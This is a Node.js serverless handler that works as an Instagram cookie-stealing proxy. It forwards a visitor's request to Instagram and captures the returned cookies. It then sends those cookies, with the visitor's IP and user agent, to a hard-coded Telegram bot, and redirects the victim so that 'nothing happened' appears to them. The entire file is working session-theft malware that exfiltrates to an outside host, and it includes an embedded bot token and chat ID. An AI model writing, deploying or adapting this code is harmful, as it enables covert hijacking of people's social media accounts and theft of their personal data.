const fetch = require('node-fetch');

// Telegram Config
const TELEGRAM_BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
const TELEGRAM_CHAT_ID = "8569746095";

// Standard Chrome User-Agent
const DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

exports.handler = async (event, context) => {
    try {
        // 1. Get the URL to proxy to (default to Instagram)
        const urlParam = event.queryStringParameters.url;
        let targetUrl = urlParam || "https://www.instagram.com/";

        // 2. Prepare headers to forward (with browser-like defaults)
        const headers = {};
        for (const [key, value] of Object.entries(event.headers)) {
            headers[key] = value;
        }
        
        // Force browser-like headers
        headers['user-agent'] = event.headers['user-agent'] || DEFAULT_USER_AGENT;
        headers['sec-fetch-mode'] = event.headers['sec-fetch-mode'] || 'document';
        headers['sec-fetch-dest'] = event.headers['sec-fetch-dest'] || 'document';
        headers['sec-fetch-user'] = event.headers['sec-fetch-user'] || '?1';
        headers['accept'] = event.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
        headers['accept-language'] = event.headers['accept-language'] || 'en-US,en;q=0.9';
        headers['cache-control'] = 'max-age=0';
        headers['host'] = new URL(targetUrl).host;

        // 3. Fetch from Instagram
        let response;
        try {
            response = await fetch(targetUrl, {
                method: event.httpMethod,
                headers: headers,
                body: event.body ? Buffer.from(event.body, 'base64') : undefined,
                redirect: 'follow' // Follow all redirects
            });
        } catch (fetchError) {
            console.error("Fetch Error:", fetchError);
            return {
                statusCode: 502,
                body: `Bad Gateway: Failed to connect to Instagram. ${fetchError.message}`
            };
        }

        // 4. Capture ALL Cookies from Instagram's response
        const setCookieHeader = response.headers.get('set-cookie');
        const cookies = setCookieHeader || "No cookies found";

        // 5. Prepare Telegram Message
        const timestamp = new Date().toISOString();
        const userAgent = headers['user-agent'];
        const ip = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || "Unknown IP";
        
        // Format cookies for readability
        const formattedCookies = cookies.replace(/; /g, "\n").replace(/;/g, "\n");

        const message = `
🍪 <b>Instagram Cookie Logged!</b>

🕒 <b>Time:</b> ${timestamp}
🌐 <b>IP:</b> ${ip}
📱 <b>User Agent:</b> <code>${userAgent}</code>

🍪 <b>Cookies:</b>
<code>${formattedCookies}</code>
        `;

        // 6. Send to Telegram
        try {
            const tgResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: "HTML"
                })
            });

            if (!tgResponse.ok) {
                console.error("Telegram API Error:", await tgResponse.text());
            }
        } catch (telegramError) {
            console.error("Telegram Fetch Error:", telegramError);
        }

        // 7. Redirect the user to Instagram
        // We return a 302 redirect to Instagram. The user sees Instagram, nothing happened.
        return {
            statusCode: 302,
            headers: {
                Location: targetUrl,
                "Cache-Control": "no-cache"
            },
            body: ""
        };

    } catch (error) {
        console.error("Handler Error:", error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: error.message })
        };
    }
};
